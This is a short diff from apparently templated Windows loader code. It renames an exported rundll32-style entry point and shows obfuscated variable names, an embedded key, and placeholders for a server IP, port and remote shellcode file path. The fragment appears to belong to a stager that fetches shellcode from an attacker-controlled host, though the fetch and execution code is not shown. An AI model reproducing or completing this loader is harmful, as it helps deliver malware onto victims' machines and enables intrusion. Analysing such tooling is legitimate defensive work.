@@ -128,7 +128,7 @@ int Random7(char* Random8, unsigned int Random8_len, char* Random9, size_t Rando
 
 char Random9[] = KEYVALUE;
 
-extern "C" void CALLBACK Go(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+extern "C" void CALLBACK ENTRYPOINT(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
     const char* Random2 = "HOSTIP";        // Replace with the actual server IP
     int Random3 = PORTY;                     // Replace with the actual server port
     const char* Random4 = "SHELLCODEFILE";   // Replace with the actual file path on the server
